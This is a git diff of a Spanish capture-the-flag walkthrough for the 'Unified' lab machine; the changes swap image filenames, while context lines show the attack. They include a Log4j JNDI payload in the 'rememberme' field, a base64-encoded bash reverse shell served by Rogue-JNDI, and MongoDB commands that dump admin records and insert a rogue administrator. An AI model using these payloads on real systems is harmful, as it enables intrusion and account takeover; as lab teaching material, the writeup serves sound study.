@@ -37,7 +37,7 @@ Iniciamos la máquina y verificamos la conexión.
 ping -c 1 10.129.125.236
 ```
 
-<figure><img src="../../../.gitbook/assets/image (636).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>
 
 Observamos que tenemos conexión y que es una máquina **Linux** ya que su **ttl=63**.
 
@@ -51,7 +51,7 @@ nmap -sC -Pn 10.129.125.236
 
 para realizar un escaneo de puertos y servicios detallado en la dirección IP.
 
-<figure><img src="../../../.gitbook/assets/image (638).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (665).png" alt=""><figcaption></figcaption></figure>
 
 ### 4. 🚪 **Acceso Inicial**
 
@@ -59,7 +59,7 @@ Como podemos observar durante el escaneo, el **puerto 22** perteneciente al **se
 
 > **Nota**: añadir la IP con unified.htb en el archivo /etc/hosts
 
-<figure><img src="../../../.gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (667).png" alt=""><figcaption></figcaption></figure>
 
 Nos redirige a la página de inicio de sesión de Unifi, versión 6.4.54. Vamos a buscar en Google ese número de versión para ver si existen vulnerabilidades. Vemos que esta versión es vulnerable a la famosa vulnerabilidad de Log4j con el número de CVE **CVE-2021-44228**. Encontramos este [artículo](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi) que será nuestra guía para explotar esta vulnerabilidad y obtener una shell reversa.
 
@@ -74,7 +74,7 @@ Nos redirige a la página de inicio de sesión de Unifi, versión 6.4.54. Vamos 
 
     Según el artículo, la vulnerabilidad está en el valor de `rememberme` emitido en la solicitud de inicio de sesión.
 
-<figure><img src="../../../.gitbook/assets/image (641).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>
 
 Para probar la vulnerabilidad, podemos usar `tcpdump` para escuchar conexiones en el puerto 1389 en la interfaz `tun0`, que es nuestra conexión VPN. Ejecuta el siguiente comando:
 
@@ -84,7 +84,7 @@ sudo tcpdump -i tun0 port 1389
 
 La carga útil que utilizaremos es la siguiente: `${jndi:ldap://10.10.16.51:1389/o=tomcat}`. Colócala en el valor de `rememberme`.
 
-<figure><img src="../../../.gitbook/assets/image (642).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>
 
 Primero, necesitamos clonar el repositorio de GitHub y construir la herramienta. Ejecuta los siguientes comandos:
 
@@ -112,13 +112,13 @@ Ahora, necesitamos iniciar el servidor LDAP Rogue-JNDI con el siguiente comando.
 java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMTAvNDQ0NCAwPiYxCg}|{base64,-d}|{bash,-i}" --hostname "10.10.16.51"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (643).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (670).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (644).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (671).png" alt=""><figcaption></figcaption></figure>
 
 Enviamos un request del Repeater y nos ponemos en escucha para conectarnos.
 
-<figure><img src="../../../.gitbook/assets/image (645).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (672).png" alt=""><figcaption></figcaption></figure>
 
 Mejoramos la shell.
 
@@ -126,7 +126,7 @@ Mejoramos la shell.
 script /dev/null -c bash
 ```
 
-<figure><img src="../../../.gitbook/assets/image (646).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (673).png" alt=""><figcaption></figcaption></figure>
 
 Este artículo nos ha ayudado a seguir los pasos necesarios para explotar la vulnerabilidad:[**Gist de AmazingTurtle: Exploitando Log4j en Unifi**](https://gist.github.com/AmazingTurtle/e8a68a0cbe501bae15343aacbf42a1d8) Este recurso proporciona una guía adicional y ejemplos sobre cómo llevar a cabo el ataque y obtener acceso no autorizado.
 
@@ -135,11 +135,11 @@ mongo --port 27117 ace
 db.admin.find().forEach(printjson); 
 ```
 
-<figure><img src="../../../.gitbook/assets/image (647).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (674).png" alt=""><figcaption></figcaption></figure>
 
 Creamos un hash del tipo sha-512 para un nuevo usuario.
 
-<figure><img src="../../../.gitbook/assets/image (648).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 db.admin.insert({ 
@@ -153,21 +153,21 @@ db.admin.insert({
 
 Nos logueamos con las credenciales.
 
-<figure><img src="../../../.gitbook/assets/image (649).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (676).png" alt=""><figcaption></figcaption></figure>
 
 ### 5. 🔑 **Captura de la Flag**
 
 Dado que el recurso actual no está cargando, revisamos el walkthrough oficial para obtener la contraseña. Según el documento oficial, la contraseña es: **NotACrackablePassword4U2022**.
 
-<figure><img src="../../../.gitbook/assets/image (650).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (677).png" alt=""><figcaption></figcaption></figure>
 
 Obtenemos las distintas flag requeridas entre los directorios.
 
-<figure><img src="../../../.gitbook/assets/image (651).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (652).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 ### 6. ❓Preguntas
 
